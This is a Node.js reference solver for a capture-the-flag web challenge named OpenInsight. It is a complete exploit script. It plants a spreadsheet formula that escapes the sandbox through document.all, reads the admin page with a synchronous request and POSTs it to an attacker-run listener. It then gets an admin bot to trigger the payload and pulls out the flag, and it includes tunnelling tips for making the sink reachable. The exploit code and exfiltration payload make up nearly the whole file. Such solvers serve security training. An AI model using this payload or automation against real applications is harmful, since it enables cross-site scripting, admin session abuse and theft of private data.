#!/usr/bin/env node
/**
 * OpenInsight — reference solver.
 *
 * 1. Start a local HTTP listener (the exfil sink).
 * 2. Sign up a disposable account, create a workbook, plant a formula
 *    that escapes the sandbox via `document.all` → window → sync XHR to
 *    `/admin`, then POSTs the response to our listener.
 * 3. Submit the sheet to the admin bot. The bot visits it logged in as
 *    admin; the payload fires from inside the admin's session and ships
 *    the `/admin` HTML (flag included) to our listener.
 * 4. Print the flag.
 *
 * Usage:
 *   WEB_URL=http://localhost:3000 BOT_URL=http://localhost:3001 \
 *   SINK_URL=http://<host-the-bot-can-reach>:4444/ node solve.js
 *
 * SINK_URL is the public URL the bot's browser POSTs the exfil to. It
 * must be reachable from inside the bot container's network. Options:
 *
 *   - Challenge running locally via docker-compose on this same host:
 *       SINK_URL=http://<your-LAN-IP>:4444/
 *
 *   - Challenge hosted remotely and you're behind NAT: expose a local
 *     port with any HTTP(S) tunnel (cloudflared / ngrok / tailscale
 *     funnel / etc.) and pass that tunnel URL as SINK_URL. Example:
 *       cloudflared tunnel --url http://localhost:4444
 *       SINK_URL=https://<random>.trycloudflare.com/ node solve.js
 *
 * Any URL works; the solver binds its local listener to the port parsed
 * from SINK_URL, or 4444 if the URL omits one (the common case when
 * tunnelling through HTTPS on :443).
 */

const http = require("node:http");
const readline = require("node:readline/promises");
const puppeteer = require("puppeteer");

async function promptUrl(message) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stderr });
  try {
    while (true) {
      const answer = (await rl.question(message)).trim();
      if (/^https?:\/\//i.test(answer)) return answer.replace(/\/+$/, "");
      process.stderr.write("    must start with http:// or https://\n");
    }
  } finally {
    rl.close();
  }
}

let WEB_URL = process.env.WEB_URL || "";
let BOT_URL = process.env.BOT_URL || "";
let SINK_URL = process.env.SINK_URL || "";

const log = (m) => console.error(`[*] ${m}`);
const die = (m) => {
  console.error(`[-] ${m}`);
  process.exit(1);
};

function startSink(port) {
  let resolveHit;
  const hit = new Promise((r) => (resolveHit = r));
  const server = http.createServer((req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      res.writeHead(200, { "Access-Control-Allow-Origin": "*" });
      res.end("ok");
      const body = Buffer.concat(chunks).toString("utf8");
      if (/UMDCTF\{|flag\{/i.test(body)) resolveHit(body);
    });
  });
  return new Promise((resolve) => {
    server.listen(port, "0.0.0.0", () => resolve({ server, hit }));
  });
}

async function main() {
  if (!WEB_URL) WEB_URL = await promptUrl("web URL (e.g. http://localhost:3000): ");
  if (!BOT_URL) BOT_URL = await promptUrl("bot URL (e.g. http://localhost:3001): ");
  if (!SINK_URL) SINK_URL = await promptUrl("sink URL (public URL the bot can POST to, e.g. http://<your-LAN-IP>:4444/ or https://<tunnel>/): ");

  const parsed = new URL(SINK_URL.endsWith("/") ? SINK_URL : SINK_URL + "/");
  const listenPort = Number(parsed.port) || (parsed.protocol === "https:" ? 4444 : 4444);
  const sinkUrl = parsed.toString();

  const { server, hit } = await startSink(listenPort);
  log(`exfil sink listening on :${listenPort} (payload will POST to ${sinkUrl})`);

  const payload =
    `=(()=>{` +
    `const w=document.all['current-user'].ownerDocument.defaultView;` +
    `const x=new w.XMLHttpRequest();x.open('GET','/admin',false);x.send();` +
    `w.fetch(${JSON.stringify(sinkUrl)},{method:'POST',body:x.responseText});` +
    `return ''})()`;

  const browser = await puppeteer.launch({
    args: ["--no-sandbox", "--disable-setuid-sandbox"],
    headless: true,
  });
  try {
    const page = await browser.newPage();
    page.setDefaultTimeout(15000);

    log("signing up");
    const username = `solver_${Date.now()}`;
    await page.goto(`${WEB_URL}/signup`, { waitUntil: "domcontentloaded" });
    await page.type("input[name=username]", username);
    await page.type("input[name=password]", `Solver9${Math.random().toString(36).slice(2)}${Date.now()}`);
    await Promise.all([
      page.waitForNavigation({ waitUntil: "domcontentloaded" }),
      page.click("main form button[type=submit]"),
    ]);

    log("creating workbook + planting payload");
    await page.goto(`${WEB_URL}/sheets/new`, { waitUntil: "domcontentloaded" });
    await page.type("input[name=title]", `solver-${Date.now()}`);
    await Promise.all([
      page.waitForNavigation({ waitUntil: "domcontentloaded" }),
      page.click("main form button[type=submit]"),
    ]);
    const sheetId = page.url().match(/\/sheets\/([^/?#]+)/)[1];

    await page.waitForSelector('[data-cell-rendered="true"]');
    const bar = await page.$("div.border-y input");
    await bar.focus();
    await bar.type(payload);
    await page.keyboard.press("Enter");
    await new Promise((r) => setTimeout(r, 1500));
    await page.close();

    log(`submitting ${sheetId} to bot`);
    const res = await fetch(`${BOT_URL}/report`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ sheetId }).toString(),
    });
    await res.text();

    log("waiting for exfil");
    const html = await hit;
    const m = html.match(/UMDCTF\{[^}]*\}/i) || html.match(/flag\{[^}]*\}/i);
    if (!m) die("no flag in exfil body");
    console.log(m[0]);
  } finally {
    await browser.close();
    server.close();
  }
}

main().catch((e) => die(e && e.stack ? e.stack : String(e)));
